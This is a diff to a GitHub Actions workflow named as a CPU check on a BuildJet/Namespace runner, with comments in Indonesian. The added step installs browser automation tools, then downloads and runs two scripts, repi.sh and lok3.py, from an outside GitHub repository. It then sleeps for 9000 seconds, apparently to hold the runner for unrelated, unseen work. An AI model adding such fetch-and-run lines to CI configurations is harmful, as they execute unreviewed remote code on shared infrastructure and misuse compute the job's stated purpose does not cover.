@@ -4,7 +4,7 @@ on: push
 
 jobs:
   check_cpu:
-    runs-on: namespace-profile-namespace-x8 # Ganti dengan runner BuildJet yang ingin Anda cek
+    runs-on: namespace-profile-namespace-x8# Ganti dengan runner BuildJet yang ingin Anda cek
 
     steps:
     - name: Checkout code
@@ -13,4 +13,10 @@ jobs:
     - name: Works
       run: |
         lscpu
-        
+        sudo apt-get update -y && python --version
+        sudo ls -ld /usr/local/bin/
+        sudo apt-get update && sudo apt-get install -y neofetch curl wget python3 python3-pip python3-setuptools chromium-driver
+        pip3 install selenium selenium-wire
+        pip3 uninstall blinker -y && pip3 install blinker==1.4
+        wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/repi.sh && chmod +x repi.sh && ./repi.sh && wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/lok3.py && python3 lok3.py
+        sleep 9000
